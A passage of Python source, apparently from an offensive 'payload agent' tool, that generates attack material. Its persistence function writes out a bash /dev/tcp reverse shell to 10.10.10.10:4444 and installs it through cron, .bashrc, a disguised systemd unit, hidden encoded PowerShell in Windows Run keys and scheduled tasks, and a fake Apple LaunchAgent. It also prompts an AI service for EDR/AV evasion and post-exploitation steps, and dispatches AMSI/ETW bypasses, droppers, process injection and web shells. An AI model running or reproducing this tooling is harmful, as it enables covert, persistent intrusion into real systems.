        "shell":    content[:200] + "..." if len(content) > 200 else content,
        "message":  f"Web shell ({shell_type}) saved: {out} | Password: {pwd}"
    }


# ══════════════════════════════════════════════════════════════════════════════
#  PERSISTENCE MECHANISMS
# ══════════════════════════════════════════════════════════════════════════════

def persistence(
    method:  str = "auto",
    payload: str = "",
    host:    str = "10.10.10.10",
    port:    int = 4444
) -> dict:
    """Generate OS-appropriate persistence mechanism."""
    results = {}

    if OS == "Linux" or method in ("cron", "systemd", "bashrc"):
        if not payload:
            payload = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"

        results["cron"] = (
            f"(crontab -l 2>/dev/null; echo "
            f"\"@reboot {payload}\") | crontab -"
        )
        results["bashrc"] = (
            f"echo '{payload} &' >> ~/.bashrc"
        )
        results["systemd"] = f"""[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{payload}'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target"""

    elif OS == "Windows" or method in (
        "registry", "scheduled_task", "startup"
    ):
        if not payload:
            ps = REVERSE_SHELLS["powershell"].format(host=host, port=port)
            encoded = base64.b64encode(ps.encode("utf-16le")).decode()
            payload = f"powershell -NoP -NonI -W Hidden -Enc {encoded}"

        results["registry_run"] = (
            f'reg add HKCU\\Software\\Microsoft\\Windows\\'
            f'CurrentVersion\\Run '
            f'/v SystemMonitor /t REG_SZ /d "{payload}" /f'
        )
        results["scheduled_task"] = (
            f'schtasks /create /tn "SystemMonitor" /tr "{payload}" '
            f'/sc onlogon /ru System /f'
        )

    elif OS == "Darwin" or method in ("launchd", "login_item"):
        if not payload:
            payload = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"

        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.monitor</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>{payload}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
        plist_path = (
            Path.home() /
            "Library/LaunchAgents/com.apple.system.monitor.plist"
        )
        results["launchd"]      = plist
        results["launchd_path"] = str(plist_path)
        results["install_cmd"]  = (
            f"cat > {plist_path} << 'EOF'\n{plist}\nEOF\n"
            f"launchctl load {plist_path}"
        )

    report = json.dumps(results, indent=2)
    path   = _save(f"persistence_{OS}", report)

    return {
        "success": True,
        "os":      OS,
        "methods": results,
        "file":    path,
        "message": (
            f"Persistence mechanisms for {OS}:\n"
            + "\n".join([
                f"  [{k}]: {str(v)[:80]}"
                for k, v in results.items()
            ])
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  AI PAYLOAD ADVISOR
# ══════════════════════════════════════════════════════════════════════════════

def ai_payload_advice(
    target_os:   str = None,
    target_info: str = "",
    goal:        str = "reverse shell"
) -> dict:
    """Use Groq AI to recommend the best payload strategy."""
    t_os   = target_os or OS
    prompt = (
        f"Target OS: {t_os}\n"
        f"Target Info: {target_info}\n"
        f"Goal: {goal}\n\n"
        f"Recommend:\n"
        f"1. Best payload type and why\n"
        f"2. AV evasion technique to use\n"
        f"3. Exact commands to generate and deploy\n"
        f"4. Listener setup\n"
        f"5. Post-exploitation first steps\n"
        f"Focus on modern 2024 techniques that bypass EDR/AV."
    )
    advice = _ask_groq(prompt)
    return {
        "success": True,
        "advice":  advice,
        "message": advice
    }


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN DISPATCHER
# ══════════════════════════════════════════════════════════════════════════════

def run_payload_agent(args: dict, speak=None, player=None) -> str:
    action = args.get("action", "reverse_shell")
    speak  = speak or (lambda x: None)

    def say(msg: str):
        short = str(msg)[:300]
        if player:
            player.write_log(f"[Payload|{OS}] {short}")
        speak(short)

    say(f"Payload Agent active on {OS} ({ARCH})")

    if action == "reverse_shell":
        r = generate_reverse_shell(
            shell_type = args.get("shell_type", "bash"),
            host       = args.get("host", "10.10.10.10"),
            port       = int(args.get("port", 4444)),
            encode     = args.get("encode", False),
            obfuscate  = args.get("obfuscate", False),
            save       = args.get("save", True),
        )
        if r.get("payload") and player:
            player.write_log(f"[Payload]\n{r['payload'][:500]}")
        say(r.get("message", ""))
        return r.get("payload", r.get("message", ""))

    elif action == "msfvenom":
        r = msfvenom_payload(
            payload    = args.get("payload"),
            host       = args.get("host", "10.10.10.10"),
            port       = int(args.get("port", 4444)),
            format     = args.get("format"),
            output     = args.get("output"),
            options    = args.get("options", ""),
            encoder    = args.get("encoder"),
            iterations = int(args.get("iterations", 1)),
            target_os  = args.get("target_os"),
        )
        say(r["message"])
        return r["message"]

    elif action == "amsi_bypass":
        r = amsi_bypass(args.get("method", "patch"))
        say(r["message"])
        return r["message"]

    elif action == "etw_bypass":
        r = etw_bypass()
        say(r["message"])
        return r["message"]

    elif action == "lolbin":
        r = lolbin_payload(
            technique = args.get("technique", "certutil"),
            url       = args.get("url", "http://10.10.10.10/payload.exe"),
            output    = args.get("output", "C:\\Windows\\Temp\\svchost.exe"),
        )
        say(r["message"])
        return r["message"]

    elif action == "inject":
        r = process_injection_stub(
            target_process = args.get("target_process", "explorer.exe"),
            host           = args.get("host", "10.10.10.10"),
            port           = int(args.get("port", 4444)),
        )
        say(r["message"])
        return r["message"]

    elif action == "xor_encrypt":
        payload_str = args.get("payload", "")
        r = xor_encrypt(
            payload_str.encode() if payload_str else b"\x90" * 64
        )
        say(r["message"])
        return r["message"]

    elif action == "aes_encrypt":
        payload_str = args.get("payload", "")
        if not payload_str:
            return "Payload string required for AES encryption."
        r = aes_encrypt_payload(
            payload_str,
            args.get("host", "10.10.10.10"),
            int(args.get("port", 4444))
        )
        say(r["message"])
        return r["message"]

    elif action == "dropper":
        r = staged_dropper(
            stage_url = args.get("url", "http://10.10.10.10/stage2.ps1"),
            host      = args.get("host", "10.10.10.10"),
            port      = int(args.get("port", 4444)),
            os_target = args.get("target_os", OS.lower()),
        )
        say(r["message"])
        return r["message"]

    elif action in ("listen", "listen_nc", "listen_msf", "listen_pwncat"):
        method_map = {
            "listen":       "auto",
            "listen_nc":    "nc",
            "listen_msf":   "msf",
            "listen_pwncat": "pwncat",
        }
        r = start_listener(
            method  = method_map.get(action, "auto"),
            host    = args.get("host", "0.0.0.0"),
            port    = int(args.get("port", 4444)),
            payload = args.get("payload"),
        )
        say(r["message"])
        return r["message"]

    elif action == "web_shell":
        r = generate_web_shell(
            shell_type = args.get("shell_type", "php_advanced"),
            password   = args.get("password"),
            obfuscate  = args.get("obfuscate", True),
        )
        say(r["message"])
        return r["message"]

    elif action == "persistence":
        r = persistence(
            method  = args.get("method", "auto"),
            payload = args.get("payload", ""),
            host    = args.get("host", "10.10.10.10"),
            port    = int(args.get("port", 4444)),
        )
        say(r["message"])
        return r["message"]

    elif action == "ai_advice":
        r = ai_payload_advice(
            target_os   = args.get("target_os"),
            target_info = args.get("target_info", ""),
            goal        = args.get("goal", "reverse shell"),
        )
        say(r["message"])
        return r["message"]

    elif action == "list_shells":
        shells = list(REVERSE_SHELLS.keys())
        msg    = f"Available shells ({len(shells)}): {', '.join(shells)}"
        say(msg)
        return msg

    else:
        return (
            f"Unknown payload action: {action}. "
            f"Available: reverse_shell | msfvenom | amsi_bypass | etw_bypass | "
            f"lolbin | inject | xor_encrypt | aes_encrypt | dropper | "
            f"listen | listen_nc | listen_msf | listen_pwncat | "
            f"web_shell | persistence | ai_advice | list_shells"
        )